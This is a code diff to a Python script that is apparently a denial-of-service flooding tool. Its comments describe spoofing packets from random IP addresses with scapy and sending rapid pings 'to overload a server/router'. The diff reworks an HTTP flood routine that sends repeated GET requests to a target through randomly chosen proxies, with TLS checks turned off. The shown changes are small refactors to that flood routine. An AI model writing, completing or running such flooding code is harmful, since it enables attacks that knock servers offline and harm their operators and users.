@@ -1,13 +1,9 @@
-#httpx 
-
-
-
 import threading #imports module "threading" used for multitaskinng
 import random #imports module "random" used for outputting random numbers, strings in an array etc. used in this script for creating random IP addresses for the "scapy" import 
 from scapy.all import * #imports all functions from "scapy" module - used for crafting/spoofing packets. we use this to send packets using the TCP and UDP protocol
 import ping3 # imports module "ping3" - used for the ICMP method (layer 3) which sends a bunch of pings really fast to overload a server/router
 import requests
-
+import httpx
 
 
 # ASCII art ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -4265,30 +4261,30 @@ proxy_list = [
 
 fail = []
 
-import httpx
 
 def http_method():
     for i in range(x):
         time.sleep(0.1)
-        targ1 = targ + ":" + port
+        targ1 = targ+":"+port
 
         global headers1
 
         if port == "80":
             proxy = random.choice(proxy_list)
-            
+        
             proxies = {
-                'http://': proxy,
-                'https://': proxy
-            }
-            
-            try:
-                http = httpx.get(targ, proxy=proxy, headers=headers1, verify=False, timeout=100)
-                print(f"Status Code 'GET': {http.status_code} | Proxy: {proxy} | TARGET: {targ1}")
-            except httpx.HTTPError as e:
-                print(f"Request failed: {e}")
-                return None  # Or handle failure gracefully
+                'http': proxy,
+                'https': proxy
 
+            }
+            #httpx
+            try:
+
+                http = httpx.get(targ, proxy = proxy, headers=headers1, verify=False)
+                print(f"Status Code 'GET': {http.status_code} | Proxy: {proxy} | TARGET : {targ1}")
+
+            except httpx.HTTPError as e:
+                return None
 
         if port == "443":
             proxy = random.choice(proxy_list)
